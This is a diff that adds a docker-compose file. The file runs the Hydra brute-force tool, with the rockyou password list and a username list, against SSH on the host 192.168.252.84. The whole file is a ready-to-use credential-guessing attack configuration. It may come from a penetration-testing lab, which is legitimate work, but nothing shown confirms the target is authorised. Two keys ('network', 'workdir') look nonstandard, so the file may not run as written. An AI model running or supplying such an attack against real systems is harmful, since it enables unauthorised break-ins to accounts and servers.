@@ -1,0 +1,14 @@
+version: "3.9"
+services:
+  hydra:
+    image: marcpartensky/hydra
+    network: host
+    command: -P /rockyou.txt -L /usernames.txt ssh://192.168.252.84
+    workdir: /root
+    volumes:
+      - ../data/hydra/rockyou.txt:/rockyou.txt
+      - ../data/hydra/usernames.txt:/usernames.txt
+      - hydra:/root
+
+volumes:
+  hydra:
